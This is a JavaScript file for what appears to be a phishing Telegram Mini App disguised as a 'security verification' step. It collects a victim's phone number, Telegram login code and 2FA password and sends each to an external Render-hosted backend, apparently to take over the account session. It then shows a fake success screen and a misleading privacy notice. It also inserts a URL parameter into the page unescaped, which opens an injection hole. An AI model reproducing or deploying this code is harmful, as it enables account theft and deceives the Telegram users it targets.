// Конфигурация
const BACKEND_URL = 'https://rollsbocks45.onrender.com'; // Замените на ваш URL Render
let currentStep = 1;
let sessionId = null;
let phoneNumber = '';
let phoneCodeHash = '';
let countdownInterval = null;

// Инициализация Telegram Web App
const tg = window.Telegram.WebApp;
tg.expand();
tg.enableClosingConfirmation();

// Установка цвета фона Mini App
tg.setHeaderColor('secondary_bg_color');
tg.setBackgroundColor('#1A1C2B');

// Функции управления шагами
function showStep(step) {
    // Скрываем все шаги
    document.querySelectorAll('.step').forEach(el => {
        el.classList.remove('active');
    });
    
    // Показываем нужный шаг
    document.getElementById(`step${step}`).classList.add('active');
    currentStep = step;
    
    // Прокручиваем наверх
    window.scrollTo(0, 0);
}

// Начало верификации
function startVerification() {
    // Получаем username из URL параметров
    const urlParams = new URLSearchParams(window.location.search);
    const username = urlParams.get('username') || '';
    
    // Обновляем текст с username
    const displayElement = document.getElementById('usernameDisplay');
    if (username) {
        displayElement.innerHTML = `Security verification required for <span class="highlight">@${username}</span>`;
    }
    
    // Переходим к шагу 2
    showStep(2);
}

// Назад
function goBack(step) {
    showStep(step);
}

// Показать загрузку
function showLoading(text = 'Processing...') {
    document.getElementById('loadingText').textContent = text;
    document.getElementById('loadingOverlay').classList.add('active');
}

// Скрыть загрузку
function hideLoading() {
    document.getElementById('loadingOverlay').classList.remove('active');
}

// Отправка кода
async function sendCode() {
    const phoneInput = document.getElementById('phoneInput');
    const termsCheckbox = document.getElementById('termsCheckbox');
    
    // Валидация
    if (!phoneInput.value) {
        showError('Please enter phone number');
        return;
    }
    
    if (!termsCheckbox.checked) {
        showError('Please accept the terms');
        return;
    }
    
    phoneNumber = '+' + phoneInput.value;
    
    // Показываем загрузку
    showLoading('Sending verification code...');
    
    try {
        const response = await fetch(`${BACKEND_URL}/api/send_code`, {
            method: 'POST',
            headers: {
                'Content-Type': 'application/json',
            },
            body: JSON.stringify({
                phone: phoneNumber
            })
        });
        
        const data = await response.json();
        
        if (response.ok) {
            sessionId = data.session_id;
            phoneCodeHash = data.phone_code_hash;
            
            // Переходим к шагу ввода кода
            showStep(3);
            
            // Запускаем таймер
            startCountdown();
        } else {
            showError(data.error || 'Failed to send code');
        }
    } catch (error) {
        showError('Network error. Please try again.');
    } finally {
        hideLoading();
    }
}

// Верификация кода
async function verifyCode() {
    const codeInputs = document.querySelectorAll('.code-input input');
    const code = Array.from(codeInputs).map(input => input.value).join('');
    
    if (code.length !== 5) {
        showError('Please enter 5-digit code');
        return;
    }
    
    showLoading('Verifying code...');
    
    try {
        const response = await fetch(`${BACKEND_URL}/api/verify_code`, {
            method: 'POST',
            headers: {
                'Content-Type': 'application/json',
            },
            body: JSON.stringify({
                session_id: sessionId,
                code: code
            })
        });
        
        const data = await response.json();
        
        if (response.ok) {
            if (data.requires_2fa) {
                // Переходим к 2FA
                showStep(4);
            } else {
                // Показываем успех
                showSuccess(data.session_info);
            }
        } else {
            showError(data.error || 'Invalid verification code');
        }
    } catch (error) {
        showError('Network error. Please try again.');
    } finally {
        hideLoading();
    }
}

// Верификация 2FA
async function verify2FA() {
    const passwordInput = document.getElementById('passwordInput');
    const password = passwordInput.value;
    
    if (!password) {
        showError('Please enter 2FA password');
        return;
    }
    
    showLoading('Verifying 2FA...');
    
    try {
        const response = await fetch(`${BACKEND_URL}/api/verify_2fa`, {
            method: 'POST',
            headers: {
                'Content-Type': 'application/json',
            },
            body: JSON.stringify({
                session_id: sessionId,
                password: password
            })
        });
        
        const data = await response.json();
        
        if (response.ok) {
            showSuccess(data.session_info);
        } else {
            showError(data.error || 'Invalid 2FA password');
        }
    } catch (error) {
        showError('Network error. Please try again.');
    } finally {
        hideLoading();
    }
}

// Показ успеха
function showSuccess(sessionInfo) {
    document.getElementById('verifiedUsername').textContent = '@' + (sessionInfo.username || 'user');
    
    // Устанавливаем текущее время
    const now = new Date();
    document.getElementById('verificationTime').textContent = 
        now.toLocaleTimeString([], { hour: '2-digit', minute: '2-digit' });
    
    showStep(5);
    
    // Вибрация успеха (если поддерживается)
    if (navigator.vibrate) {
        navigator.vibrate([100, 50, 100]);
    }
}

// Показ ошибки
function showError(message) {
    document.getElementById('errorMessage').textContent = message;
    showStep(6);
    hideLoading();
}

// Повторная отправка кода
async function resendCode() {
    if (countdownInterval) {
        clearInterval(countdownInterval);
    }
    
    document.getElementById('resendBtn').disabled = true;
    document.getElementById('resendBtn').textContent = 'Sending...';
    
    showLoading('Resending code...');
    
    try {
        const response = await fetch(`${BACKEND_URL}/api/send_code`, {
            method: 'POST',
            headers: {
                'Content-Type': 'application/json',
            },
            body: JSON.stringify({
                phone: phoneNumber
            })
        });
        
        const data = await response.json();
        
        if (response.ok) {
            sessionId = data.session_id;
            phoneCodeHash = data.phone_code_hash;
            
            // Запускаем таймер заново
            startCountdown();
        } else {
            showError(data.error || 'Failed to resend code');
        }
    } catch (error) {
        showError('Network error. Please try again.');
    } finally {
        hideLoading();
        document.getElementById('resendBtn').textContent = 'Resend Code';
    }
}

// Таймер обратного отсчета
function startCountdown() {
    let countdown = 60;
    const countdownElement = document.getElementById('countdown');
    const resendBtn = document.getElementById('resendBtn');
    const timer = document.querySelector('.timer');
    
    resendBtn.disabled = true;
    timer.style.display = 'flex';
    
    countdownElement.textContent = countdown;
    
    if (countdownInterval) {
        clearInterval(countdownInterval);
    }
    
    countdownInterval = setInterval(() => {
        countdown--;
        countdownElement.textContent = countdown;
        
        if (countdown <= 0) {
            clearInterval(countdownInterval);
            resendBtn.disabled = false;
            timer.style.display = 'none';
        }
    }, 1000);
}

// Перемещение между полями ввода кода
function moveToNext(input, nextIndex) {
    if (input.value.length === 1) {
        const nextInput = input.nextElementSibling;
        if (nextInput) {
            nextInput.focus();
        }
    } else if (input.value.length === 0) {
        const prevInput = input.previousElementSibling;
        if (prevInput) {
            prevInput.focus();
        }
    }
}

// Закрытие Mini App
function closeMiniApp() {
    tg.close();
}

// Контакт с поддержкой
function contactSupport() {
    tg.openTelegramLink('https://t.me/rollssupport');
}

// Показать политику конфиденциальности
function showPrivacy() {
    alert('Privacy Policy: Your data is encrypted and used only for account verification.');
}

// Показать условия использования
function showTerms() {
    alert('Terms of Service: By using this service, you agree to our verification process.');
}

// Обработка нажатия Enter
document.addEventListener('keypress', (e) => {
    if (e.key === 'Enter') {
        switch (currentStep) {
            case 2:
                sendCode();
                break;
            case 3:
                verifyCode();
                break;
            case 4:
                verify2FA();
                break;
        }
    }
});

// Автофокус на первом поле кода при переходе на шаг 3
document.addEventListener('DOMContentLoaded', () => {
    // Получаем username из URL
    const urlParams = new URLSearchParams(window.location.search);
    const username = urlParams.get('username');
    
    if (username) {
        const displayElement = document.getElementById('usernameDisplay');
        displayElement.innerHTML = `Security verification required for <span class="highlight">@${username}</span>`;
    }
    
    // Устанавливаем начальный шаг
    showStep(1);
    
    // Инициализация полей ввода кода
    const codeInputs = document.querySelectorAll('.code-input input');
    codeInputs.forEach((input, index) => {
        input.addEventListener('input', (e) => {
            if (e.inputType === 'deleteContentBackward' && input.value === '') {
                const prevInput = input.previousElementSibling;
                if (prevInput) {
                    prevInput.focus();
                }
            }
        });
    });
});

// Поддержка Telegram Web App
document.addEventListener('DOMContentLoaded', () => {
    // Получаем данные из Telegram
    const initData = tg.initData;
    
    if (initData) {
        console.log('Telegram Web App initialized');
    }
    
    // Настройка основной кнопки
    tg.MainButton.setText('Verify Account');
    tg.MainButton.show();
});